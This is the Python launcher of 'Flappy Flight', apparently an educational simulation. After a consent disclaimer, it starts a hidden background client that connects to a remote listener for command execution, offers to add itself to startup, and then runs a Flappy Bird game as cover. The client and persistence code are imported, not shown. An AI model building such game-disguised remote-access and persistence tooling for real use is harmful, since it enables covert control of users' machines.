"""
Flappy Flight - Main Launcher
Entry point that orchestrates the entire Flappy Flight system:
1. Shows disclaimer and obtains user consent
2. Checks and installs dependencies
3. Starts the background client in a daemon thread
4. Optionally enables persistence
5. Launches the Flappy Bird game
"""

import os
import sys
import time

# Ensure the project root is in the path
PROJECT_ROOT = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, PROJECT_ROOT)

from config import APP_NAME, LISTENER_HOST, LISTENER_PORT, VERSION


def print_banner():
    """Display the Flappy Flight launch banner."""
    banner = f"""
\033[36m
  ███████╗██╗      █████╗ ██████╗ ██████╗ ██╗   ██╗
  ██╔════╝██║     ██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
  █████╗  ██║     ███████║██████╔╝██████╔╝ ╚████╔╝
  ██╔══╝  ██║     ██╔══██║██╔═══╝ ██╔═══╝   ╚██╔╝
  ██║     ███████╗██║  ██║██║     ██║        ██║
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝        ╚═╝

  ███████╗██╗     ██╗ ██████╗ ██╗  ██╗████████╗
  ██╔════╝██║     ██║██╔════╝ ██║  ██║╚══██╔══╝
  █████╗  ██║     ██║██║  ███╗███████║   ██║
  ██╔══╝  ██║     ██║██║   ██║██╔══██║   ██║
  ██║     ███████╗██║╚██████╔╝██║  ██║   ██║
  ╚═╝     ╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝

                    v{VERSION} - Cybersecurity Simulation
\033[0m"""
    print(banner)


def show_disclaimer():
    """
    Display the disclaimer and get user consent.
    Returns True if user agrees, False otherwise.
    """
    disclaimer = f"""
\033[33m╔══════════════════════════════════════════════════════════════════╗
║                        ⚠ DISCLAIMER ⚠                          ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  {APP_NAME} is a CYBERSECURITY SIMULATION for EDUCATIONAL        ║
║  purposes only.                                                  ║
║                                                                  ║
║  By running this program, you acknowledge that:                  ║
║                                                                  ║
║  1. A BACKGROUND PROCESS will be started that connects to a      ║
║     remote listener at {LISTENER_HOST}:{LISTENER_PORT}                       ║
║     allowing limited remote command execution.                   ║
║                                                                  ║
║  2. PERSISTENCE may be enabled, which adds this program to       ║
║     your system's startup applications.                          ║
║                                                                  ║
║  3. All actions are LOGGED and only SAFE commands are allowed.   ║
║                                                                  ║
║  4. A CLEANUP TOOL is provided to remove all changes.            ║
║     Run: python3 -m cleanup.cleanup                              ║
║                                                                  ║
║  5. This should ONLY be run in a VIRTUAL MACHINE for testing.    ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝\033[0m
"""
    print(disclaimer)

    try:
        consent = input('\033[33m  To proceed, type "I AGREE": \033[0m').strip()
        if consent.upper() == "I AGREE":
            print("\n\033[32m  [✓] Consent received. Proceeding...\033[0m\n")
            return True
        else:
            print("\n\033[31m  [✗] Consent not given. Exiting.\033[0m\n")
            return False
    except (KeyboardInterrupt, EOFError):
        print("\n\n\033[31m  [✗] Cancelled. Exiting.\033[0m\n")
        return False


def check_deps():
    """Check dependencies."""
    from client.dependency_checker import check_dependencies
    return check_dependencies()


def start_background_client():
    """Start the background client in a daemon thread."""
    from client.client import FlappyFlightClient

    print("\033[36m  [*] Starting background client...\033[0m")
    print(f"\033[36m  [*] Target listener: {LISTENER_HOST}:{LISTENER_PORT}\033[0m")

    client = FlappyFlightClient()
    thread = client.start_background()

    # Give the client a moment to attempt connection
    time.sleep(1)

    if client.connected:
        print("\033[32m  [✓] Connected to listener!\033[0m\n")
    else:
        print("\033[33m  [!] Listener not available. Client will retry in background.\033[0m")
        print("\033[33m  [i] Start the listener: python3 -m server.listener\033[0m\n")

    return client


def prompt_persistence():
    """Ask user if they want to enable persistence."""
    from client.persistence import enable_persistence, is_persistence_installed

    if is_persistence_installed():
        print("\033[33m  [i] Persistence is already enabled.\033[0m\n")
        return

    print("\033[33m╔══════════════════════════════════════════════╗")
    print("║          Persistence Configuration           ║")
    print("╠══════════════════════════════════════════════╣")
    print("║                                              ║")
    print("║  Enabling persistence will add Flappy Flight     ║")
    print("║  to your system's startup applications.      ║")
    print("║                                              ║")
    print("║  The client will automatically reconnect     ║")
    print("║  to the listener after system restart.       ║")
    print("║                                              ║")
    print("║  This can be removed using the cleanup tool. ║")
    print("║                                              ║")
    print("╚══════════════════════════════════════════════╝\033[0m")

    try:
        choice = input("\n\033[33m  Enable persistence? (y/n): \033[0m").strip().lower()
        if choice == 'y':
            print()
            enable_persistence()
        else:
            print("\n\033[33m  [i] Persistence not enabled.\033[0m")
    except (KeyboardInterrupt, EOFError):
        print("\n\033[33m  [i] Persistence not enabled.\033[0m")

    print()


def launch_game():
    """Launch the Flappy Bird game."""
    print("\033[36m  ─────────────────────────────────────────\033[0m")
    print("\033[32m  [*] Launching Flappy Flight game...\033[0m")
    print("\033[36m  [i] Press ESC or close window to exit.\033[0m")
    print("\033[36m  ─────────────────────────────────────────\033[0m\n")

    time.sleep(1)

    from game.flappy_bird import start_game
    start_game()


def main():
    """Main launcher execution flow."""
    # Step 0: Ensure we are running in the virtual environment
    from client.dependency_checker import ensure_venv, get_venv_python
    if not ensure_venv():
        venv_py = get_venv_python()
        print(f"\033[33m  [*] Restarting under virtual environment: {venv_py}\033[0m")
        # Ensure the script is restarted with the same arguments
        os.execv(venv_py, [venv_py] + sys.argv)

    print_banner()

    # Step 1: Show disclaimer and get consent
    if not show_disclaimer():
        sys.exit(0)

    # Step 2: Check dependencies
    if not check_deps():
        print("\033[31m  [✗] Cannot proceed without required dependencies.\033[0m")
        sys.exit(1)

    # Step 3: Start background client
    client = start_background_client()

    # Step 4: Persistence prompt
    prompt_persistence()

    # Step 5: Launch game
    try:
        launch_game()
    except Exception as e:
        print(f"\033[31m  [✗] Game error: {e}\033[0m")
    finally:
        # Cleanup background client
        print("\n\033[33m  [*] Shutting down background client...\033[0m")
        client.disconnect()
        print("\033[32m  [✓] Flappy Flight session ended.\033[0m")
        print(f"\033[33m  [i] To remove persistence: python3 -m cleanup.cleanup\033[0m\n")


if __name__ == "__main__":
    main()
